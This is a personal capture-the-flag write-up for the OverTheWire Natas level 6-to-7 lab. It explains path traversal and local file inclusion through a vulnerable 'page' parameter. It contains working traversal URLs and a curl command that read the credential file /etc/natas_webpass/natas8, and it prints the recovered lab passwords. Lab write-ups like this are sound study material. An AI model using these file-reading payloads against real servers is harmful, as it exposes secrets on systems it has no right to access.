Natas Level 6 → Level 7
=======================

Username: natas7
URL:      http://natas7.natas.labs.overthewire.org


Solution
========

When we browse to the URL and log with our valid credentials that we gained in level5-6, we get into a web site that gives us a small menu consiting of web links.
There are two links. One is "Home" and the other is "About". When we click on "Home" we are redirected to the home page with the URL ```http://natas7.natas.labs.overthewire.org/index.php?page=home```
and a message that says ```this is the front page```. Nearly the same happens when we click on "About". This time we get redirected to URL ```http://natas7.natas.labs.overthewire.org/index.php?page=about``` while the message says ```this is the about page```.

If we look into the source code of the web pages we find this:

```
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

Since the path /etc/natas_webpass/natas8 looks like a UNIX file system path instead of a web path, 
my first assumption was that this level is related to the so-called [```Path Traversal```](https://www.owasp.org/index.php/Path_Traversal) attack.
Nowadays the usual default UNIX file system path for the web server's documents (aka [```Document Root```](https://httpd.apache.org/docs/2.4/mod/core.html#documentroot)) is ```/var/www/html``` or something similar.
According to the [Path Traversal attack documentation](https://www.owasp.org/index.php/Path_Traversal) from OWASP, a vulnerable web application might give us the content of any file if we correctly generate an URL that represents the path of the file.

```
Example 1
[...]
http://some_site.com.br/get-files?file=../../../../some dir/some file 
[...]
```

So let's try to put these information togehter and browse to the following URL:

```
http://natas7.natas.labs.overthewire.org/index.php?page=../../../etc/natas_webpass/natas8
```

The substring ```../../../``` represents the fact that I expect the webserver's Document Root to be in ```/var/www/html``` or something like this. 
If the web site is located in that directory and the web application is vulnerable, we should get the password file ```/etc/natas_webpass/natas8```.
Unfortunately it only returns an error message:

```
Warning: include(../../../etc/natas_webpass/natas8): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21
Warning: include(): Failed opening '../../../etc/natas_webpass/natas8' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/natas/natas7/index.php on line 21
```

But even if we get an error message, we now know that the web application is vulnerable and can be attacked with a ```Path Traversal```.
All we have to do is to find the correct amount of ```../``` in order to hit the root directory (```/```) of the web server's underlying UNIX file system.
Fortunately the error message tells us the correct path: ```No such file or directory in /var/www/natas/natas7/index.php on line 21``` indicates that the web sites path is ```/var/www/natas/natas7```.
So we need 4 times ```../``` in order to hit the root of the UNIX file system. If we now browse to the modified URL ```http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8``` we get the next level's password:

```
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
```

Note to myself
--------------

Instead of using a GUI web browser like Firefox one can use cURL instead:
```
curl "http://natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9@natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
```

Another note to myself
----------------------

There's a difference between [```Path Traversal attacks```](https://www.owasp.org/index.php/Path_Traversal) and [```Local File Inclusion / Remote File Inclusion (LFI/RFI) attacks```](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion):

> A file include vulnerability is distinct from a generic Directory Traversal Attack, in that directory traversal is a way of gaining unauthorized file system access, and a file inclusion vulnerability subverts how an application loads code for execution. Successful exploitation of a file include vulnerability will result in remote code execution on the web server that runs the affected web application.

Previously I've shown how to exploit level6-7 using a ```Path Traversal attack```. But Level6-7 can also be solved with browsing to the following URL...

```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

...which could be a ```Local File Inclusion (LFI) attack``` if the file would be executed. But this doesn't seem to work here:

```
http://natas7.natas.labs.overthewire.org/index.php?page=/bin/ls
```
```
Warning: Unexpected character in input: '' (ASCII=15) state=0 in /bin/ls on line 51
Warning: Unexpected character in input: '' (ASCII=2) state=0 in /bin/ls on line 51
Warning: Unexpected character in input: ' in /bin/ls on line 51
Warning: Unexpected character in input: ' in /bin/ls on line 51
Parse error: syntax error, unexpected '1' (T_LNUMBER) in /bin/ls on line 51
```
